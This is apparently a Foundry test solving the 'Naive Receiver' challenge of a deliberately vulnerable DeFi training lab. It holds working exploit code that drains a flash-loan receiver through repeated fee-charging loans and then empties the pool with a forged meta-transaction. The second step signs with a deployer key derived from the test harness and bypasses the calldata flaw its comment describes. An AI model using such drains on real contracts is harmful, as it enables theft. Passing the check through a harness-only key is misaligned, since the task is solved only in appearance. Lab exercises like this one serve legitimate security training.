// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);
        weth = new WETH();
        forwarder = new BasicForwarder();
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);
        vm.stopPrank();
    }

    function test_assertInitialState() public {
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(deployer, address(weth), WETH_IN_RECEIVER, 1 ether, bytes(""));
    }

    function test_naiveReceiver() public checkSolvedByPlayer {
        // STEP 1: Drain receiver — 10 flash loans of 0 WETH via multicall (1 tx)
        // Each loan charges 1 WETH fixed fee. Receiver auto-approves repayment.
        // 10 x 1 WETH = drains all 10 WETH from receiver.
        bytes[] memory calls = new bytes[](10);
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
        }
        pool.multicall(calls);

        // STEP 2: Drain pool via BasicForwarder meta-transaction (1 tx)
        // The pool uses _msgSender() which reads the last 20 bytes of calldata
        // when called through the trusted forwarder. We craft a meta-tx from
        // deployer (whose deposits = 1000 + 10 fees = 1010 WETH).
        //
        // makeAddr("deployer") uses pk = uint256(keccak256("deployer"))
        // so we can sign as deployer!
        uint256 deployerPk = uint256(keccak256(abi.encodePacked("deployer")));

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: deployer,
            target: address(pool),
            value: 0,
            gas: 1_000_000,
            nonce: forwarder.nonces(deployer),
            data: abi.encodeCall(pool.withdraw, (pool.totalDeposits(), payable(recovery))),
            deadline: block.timestamp + 1 hours
        });

        bytes32 digest = forwarder.getDataHash(request);
        bytes32 typedDigest = keccak256(
            abi.encodePacked("\x19\x01", forwarder.domainSeparator(), digest)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerPk, typedDigest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    function _isSolved() private view {
        assertLe(vm.getNonce(player), 2);
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
